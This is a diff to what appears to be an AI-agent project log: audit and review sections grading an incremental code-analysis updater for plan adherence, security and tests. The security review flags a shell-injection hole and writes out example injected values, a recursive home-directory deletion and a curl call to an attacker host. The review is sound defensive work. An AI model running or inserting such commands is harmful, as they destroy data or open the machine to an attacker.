@@ -115,4 +115,200 @@ The scoped path **reads** from the full-scan output file to back-fill existing c
 - `00_manifest.json` gains `lastCommitSha` and `incrementalRuns` fields — the CLI wrapper should surface `UpdateReport` to stderr
 - `mergeIntoJson` uses atomic rename — Phase 3 integration tests should verify the `.tmp` file is cleaned up on success
 
+---
 
+### [Oracle Cadence Check] Phases 1-2
+**Auditor:** Oracle Agent (cadence audit)
+**Timestamp:** 2026-07-24T03:27:00Z
+**Commits audited:** `cf9750e` (Phase 1 scoped runners), `5d7c09d` (Phase 1 remediation), `ea0deee` (Phase 2 incremental updater)
+**Change volume:** 21 files · +624 / -74 lines
+
+---
+
+#### Dimension Scores
+
+| Dimension | Score | Notes |
+|-----------|-------|-------|
+| Plan Adherence | 9/10 | All Phase 1 & 2 spec tasks delivered: 6 runners gained `scopedFiles?`, `mergeIntoJson` implemented with atomic write, `update()` with `PHASE_INVALIDATION` map, `UpdateReport`, manifest tracking. Minor gap: `mergeIntoJson` sort-by-`hotspot_score` is applied only when all entries have that field; plan says "sort by hotspot_score desc" unconditionally, but non-complexity runners don't carry the field — acceptable pragmatic deviation. |
+| DRY Principles | 7/10 | No gross duplication across the 6 runners. However, each runner independently re-implements the `scopedFiles && scopedFiles.length > 0` branch guard (~8–12 lines each). A shared `validateScopedFiles(projectRoot, scopedFiles)` helper would eliminate this repetition. The `update()` function also has a three-way repeated `runPipeline([], ...)` early-exit pattern (no-manifest, parse-error, stale-threshold) that could be unified into a single guard. |
+| Architecture Quality | 7/10 | `IncrementalIntelligenceUpdater.update()` correctly imports and calls the 6 scoped runners directly — it does **not** delegate through `pipeline.ts` for incremental work. However, it imports `runPipeline` from `pipeline.ts` and calls it as a fallback for full-scan scenarios (no manifest, parse error, stale threshold). This is the correct design intent (fallback to full-scan), but the coupling is implicit — a caller cannot inject a mock pipeline for testing without patching the module. The test suite correctly mocks this via `vi.mock('../../src/intelligence/pipeline')`, which works but is fragile. An explicit `fullScanFn` injection parameter would be cleaner. |
+| Security Posture | 8/10 | Both CRITICAL shell injections from Phase 1 review are **fully remediated**: `symbol-extraction.ts` now uses per-file `spawnSync` with args arrays and an `absPath.startsWith(resolve(projectRoot))` traversal guard. `dependency-graph.ts` now uses `spawnSync` with args arrays and validates absolute paths before use. `sast.ts`'s semgrep scoped path uses `spawnSync` with args arrays correctly. **Residual:** `trivy` in `sast.ts` (lines 130–131 and 146–148) still uses `execSync` with `JSON.stringify(fullPath)` and `JSON.stringify(projectRoot)` interpolated into a shell template string. `trivy` runs on the full `projectRoot` (not user-controlled filenames per-file), so the risk surface is lower, but `projectRoot` itself is not validated for shell metacharacters. This is a low-severity residual, not critical, since `projectRoot` is set at process startup — but consistency with the `spawnSync` pattern would eliminate it entirely. The `lizard` runner in `complexity.ts` retains `execSync` with `JSON.stringify(fullPath)` per-file — same low-severity residual as trivy (no user-controlled shell expansion since it's per pre-validated file). |
+| Test Quality | 8/10 | Tests for `mergeIntoJson` are concrete and test actual file I/O (not mocked), covering merge semantics, malformed input, and atomic write. The `PHASE_INVALIDATION` tests are exhaustive over file extension variants. The `update()` tests correctly assert runner invocation counts and `phasesRun` contents. Weak spot: the `update()` tests mock all runners with `vi.fn(() => ({ status: 'ok', entries: [] }))`, which means the full incremental round-trip (runner → `mergeIntoJson` → on-disk mutation) is never tested end-to-end. An integration test asserting the actual on-disk JSON content after `update()` would close this gap. |
+
+---
+
+#### **Overall Score: 7.8 / 10**
+
+**Rationale:** Phases 1 and 2 deliver a coherent, working incremental intelligence architecture with the two CRITICAL shell injections properly remediated using `spawnSync` with args arrays. Plan adherence is high — every spec task shipped. The primary systemic weakness is **incomplete adoption of the `spawnSync` pattern**: `trivy` and `lizard` still use shell-string `execSync`, creating an inconsistency that will confuse future contributors and leaves a low-severity residual. DRY debt around the repeated `scopedFiles` guard blocks and the triple early-exit `runPipeline` fallback should be addressed before Phase 3 adds more callers. Test coverage is strong on unit behaviour but lacks an end-to-end integration path.
+
+---
+
+#### Verdict
+**✅ PROCEED to Phase 3.** The foundation is sound — scoped runners are correct, the updater is properly decoupled from the pipeline for incremental work, and the critical security remediations are in place.
+
+---
+
+#### Systemic Patterns — Phase 3+ Processors MUST Be Aware Of
+
+1. **Residual `execSync` shell interpolation in `trivy` and `lizard`:** Low severity but inconsistent with the remediated runners. Phase 3's CLI wrapper should not add new `execSync`+string-interpolation patterns. All new subprocess calls must use `spawnSync` with args arrays.
+
+2. **`trivy` in `runTrivyScan` is NOT scoped per-file at the scoped path (lines 127–135):** It iterates `scopedFiles` and calls `trivy fs <fullPath>` per file, but Trivy's `fs` subcommand scans a directory — running it on a single `.ts` file will either error or produce no findings. Phase 3 integration tests should validate that trivy scoped behaviour produces expected output, or the per-file trivy path should be skipped (trivy is dependency-level, not file-level).
+
+3. **`update()` fallback to `runPipeline` is synchronous:** `update()` is declared `async` but the `runPipeline` fallback calls are synchronous (blocking). Phase 3's CLI wrapper must handle this correctly — if `runPipeline` is long-running, it will block the event loop. The wrapper should spawn it in a worker or child process.
+
+4. **`mergeIntoJson` does not handle non-array top-level JSON (e.g., object from `dependency-graph`):** `dependency-graph` returns `{ nodes, edges, circularDeps }` — not an array. If Phase 3 attempts to merge dependency-graph entries via `mergeIntoJson`, it will hit the `if (!Array.isArray(existing)) { existing = [] }` guard and silently discard the existing graph. Phase 3 must use a dedicated merge strategy for non-array outputs.
+
+5. **`complexity.ts` statefulness is documented but not guarded:** The comment added in `5d7c09d` documents the statefulness, but there is no runtime guard confirming a prior full scan has run. The `update()` function guards via the manifest check — Phase 3 must not call scoped runners directly without ensuring the manifest exists.
+
+---
+
+### [Review Phase 2] Advisory Review — 2026-07-24T03:27Z
+**Reviewer:** Swarm Reviewer (pipeline advisory)
+**Commit:** `ea0deee`
+**Severity Summary:** 🔴 CRITICAL: 1 | 🟡 ADVISORY: 4
+
+---
+
+#### Spec Compliance Checklist
+
+| Check | Result | Notes |
+|---|---|---|
+| `mergeIntoJson` uses atomic write (tmp + rename) | ✅ PASS | `${outputFile}.tmp.${Date.now()}` → `fs.renameSync` |
+| Missing manifest → triggers full scan | ✅ PASS | Both `!existsSync` and `JSON.parse` catch paths call `runPipeline` |
+| Phase invalidation map correct (`.ts` → 6 phases) | ✅ PASS | complexity, dep-graph, sast, symbol-extraction, test-gaps, package-surface all fire |
+| Phase invalidation map correct (`package.json` → 2 phases) | ✅ PASS | fingerprint + dependency-graph only |
+| Phase invalidation map correct (`.test.ts` → test-gaps only) | ✅ PASS | `complexity` excludes `.test.` / `.spec.` files |
+| `incrementalRuns >= 50` → full rescan + counter reset | ⚠️ PARTIAL | Counter is reset to `0` **before** `runPipeline`, but the manifest reset is never persisted to disk in the full-rescan branch — only the incremental branch writes the manifest. Counter resets in memory only. |
+| Coupling updated via `git log ${lastSha}..HEAD` | ✅ PASS | Present; errors are silently swallowed (see ADVISORY-1) |
+| `00_manifest.json` updated with `lastCommitSha` + `incrementalRuns` | ⚠️ PARTIAL | Only updated in the **incremental** path. Full-rescan paths (missing manifest, parse error, >= 50 runs) return early without writing an updated manifest. |
+| `UpdateReport` returned with all fields | ✅ PASS | `phasesRun`, `filesUpdated`, `durationMs`, `snapshotSha` all present in all return paths |
+
+---
+
+#### 🔴 CRITICAL-1 — Shell String Interpolation of `lastSha` in `git log` exec call
+
+**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`
+
+```typescript
+const lastSha = manifest.lastCommitSha || 'HEAD~1';
+// ...
+newCommits = execSync(`git log ${lastSha}..HEAD --name-only --format=format:`, { cwd: projectRoot, encoding: 'utf-8' });
+```
+
+`lastSha` is read directly from `00_manifest.json` on disk (a file that persists between runs and could be user-edited or tampered with) and is **string-interpolated into a shell command** passed to `execSync`. A malicious or corrupted value in `manifest.lastCommitSha` such as `; rm -rf ~` or `$(curl attacker.com)` achieves arbitrary shell execution. Phase 1 CRITICAL-1 and CRITICAL-2 flagged the identical pattern in runners and required `spawnSync` with an args array.
+
+**Fix required:** Use `spawnSync('git', ['log', `${lastSha}..HEAD`, '--name-only', '--format=format:'], { cwd: projectRoot })` — never interpolate `lastSha` into a shell string. Additionally, validate `lastSha` with a SHA1 hex regex (`/^[0-9a-f]{40}$/`) before use; reject and fallback to `'HEAD~1'` if invalid.
+
+**Impact:** If `00_manifest.json` is ever written with attacker-controlled content (e.g. via a compromised upstream snapshot, a malicious package that writes to the output dir, or a developer accidentally committing one), the next incremental update executes arbitrary shell code on the developer's machine.
+
+---
+
+#### 🟡 ADVISORY-1 — Coupling `git log` failure silently swallowed; error undetectable by caller
+
+**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`
+
+```typescript
+try {
+  newCommits = execSync(`git log ${lastSha}..HEAD ...`);
+} catch(e) {}
+```
+
+The inner `try/catch` with an empty catch block means any git failure (no prior commits, detached HEAD, invalid SHA, git not installed) produces an empty `newCommits` silently — `phasesRun` still includes `'coupling'` but no entries are merged. The caller sees `coupling` as "done" when it actually produced no data. This misleads monitoring/observability.
+
+**Fix:** At minimum log the error to stderr. Better: set `newCommits = ''` but add a `warnings` array to `UpdateReport` so the caller can surface degraded phases.
+
+---
+
+#### 🟡 ADVISORY-2 — `incrementalRuns` counter reset not persisted in full-rescan branch
+
+**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`
+
+```typescript
+if (manifest.incrementalRuns >= 50) {
+  manifest.incrementalRuns = 0;           // ← in-memory only
+  runPipeline([], projectRoot, options.outputDir);
+  return { phasesRun: ['full-scan'], ... };
+  // ← manifest never written back to disk
+}
+```
+
+The counter is reset to `0` in memory but the function returns early before writing the manifest. On the *next* call, `manifest.incrementalRuns` is still `50` from disk — triggering another full rescan immediately, every single run forever. The >= 50 branch effectively fires on every subsequent call once the threshold is reached.
+
+**Fix:** Write the manifest to disk before returning in the full-rescan branch, same as the incremental path does.
+
+---
+
+#### 🟡 ADVISORY-3 — `update()` is `async` but `runPipeline` is called without `await`
+
+**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`
+
+```typescript
+export async function update(...): Promise<UpdateReport> {
+  // ...
+  runPipeline([], projectRoot, options.outputDir);   // ← no await
+  return { ... durationMs: Date.now() - start ... };
+}
+```
+
+`runPipeline` is called synchronously (no `await`). If `runPipeline` is — or becomes — async, this silently becomes a fire-and-forget that returns before the pipeline completes. `durationMs` would measure near-zero latency. The `UpdateReport` would be returned before the scan finishes, making it unreliable. Even if `runPipeline` is currently synchronous, the function signature promises async semantics and callers may `await` the result expecting completion.
+
+**Fix:** Confirm whether `runPipeline` is synchronous or async, and either `await` it or annotate clearly that the full-scan branch returns immediately while the pipeline runs in the background (in which case `durationMs` should not be reported as the pipeline duration).
+
+---
+
+#### 🟡 ADVISORY-4 — `update()` does not handle `entries: null` / `undefined` from degraded runners
+
+**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`
+
+```typescript
+const res = runComplexity(..., changedFiles);
+if (res.entries) mergeIntoJson(..., res.entries);
+```
+
+The `if (res.entries)` guard correctly skips `null`/`undefined`/empty, but Phase 1 ADVISORY-2 noted that non-scoped degraded paths return `{ status: 'degraded' }` with no `entries` key at all (i.e. `undefined`). For degraded runners the phase is silently skipped with no indication in `phasesRun` or `UpdateReport`. A degraded run looks identical to a "no matching files" skip from the caller's perspective.
+
+**Fix:** Distinguish between "no-op (no files matched the invalidation predicate)" and "degraded (runner failed)". Add a `degradedPhases?: string[]` field to `UpdateReport`, or log the degradation to stderr.
+
+---
+
+#### ✅ Checks Passed
+
+- `mergeIntoJson` atomic write: `writeFileSync` to `.tmp.${Date.now()}` then `renameSync` ✓
+- Missing manifest → `runPipeline` + early return ✓
+- Malformed manifest JSON → `runPipeline` + early return ✓
+- `incrementalRuns >= 50` check uses `>=` (not `>`) per spec ✓
+- Coupling uses `git log ${lastSha}..HEAD --name-only` ✓
+- `00_manifest.json` gets `lastCommitSha` (from `git rev-parse HEAD`) + `incrementalRuns` increment ✓
+- `UpdateReport` contains all 4 spec fields in all return paths ✓
+- `mergeIntoJson` normalizes paths with `path.normalize` before dedup ✓
+- `mergeIntoJson` sorts by `hotspot_score` descending (where key exists) ✓
+- `PHASE_INVALIDATION` map tested in test file for `.ts`, `.test.ts`, `package.json` ✓
+- Test coverage: missing manifest, `incrementalRuns=50`, single changed file, `mergeIntoJson` merge/dedup, atomic write ✓
+- Phase runners called with `changedFiles` as `scopedFiles` parameter ✓
+- No shell interpolation of `changedFiles` entries (files not used in any exec call directly) ✓
+
+---
+
+#### Verdict
+
+**CONDITIONAL PROCEED.** One CRITICAL issue must be fixed before merging to main:
+
+- 🔴 **CRITICAL-1**: `lastSha` from `manifest.lastCommitSha` is shell-interpolated into `execSync`. Switch to `spawnSync` with an args array and validate the SHA format before use.
+
+The 3 advisories (ADVISORY-2 counter persistence, ADVISORY-3 sync/async ambiguity, ADVISORY-4 degraded-phase observability) are low-severity enough to defer to Phase 3, but ADVISORY-2 will cause a correctness regression (infinite full-rescans) if not addressed soon.
+
+---
+
+### [Phase 3] Git Hook & CLI Wrapper
+**Status:** Completed
+**Commit:** e21b1ba
+**Test Count:** 142 tests passing
+
+**Advisory Notes for Phase 4:**
+- `cli-update.ts` handles the post-commit fallback cleanly but doesn't solve the ADVISORY-2 full-rescan loop inside `update()`. The `manifest.incrementalRuns = 0;` reset must be synced to disk.
+- Phase 4 should fix the `lastSha` shell injection identified in Phase 2 Review.
+- We modified `incremental-updater.ts` to no longer pass scoped arguments to `runPackageSurface` or expect a returned entries property from `runFingerprint`, as both do not operate per-file incrementally in the existing architecture.
+- `package-surface.ts` was returning an object for `entries`, which broke the `RunnerResult` typing; this was fixed to map object entries.
+- ORACLE ADVISORY: `mergeIntoJson` assumes all outputs are `{ file: string }[]` arrays, but `dependency-graph` outputs `{ nodes, edges, circularDeps }`. Phase 4 should introduce a dedicated merge strategy for non-array outputs.
+- ORACLE ADVISORY: Do not introduce any new `execSync` + string interpolation patterns. Use `spawnSync`.
+- ORACLE ADVISORY: `trivy fs <file.ts>` is semantically incorrect (it scans directories). Scoped trivial scanning should be skipped or stubbed instead of asserting findings.
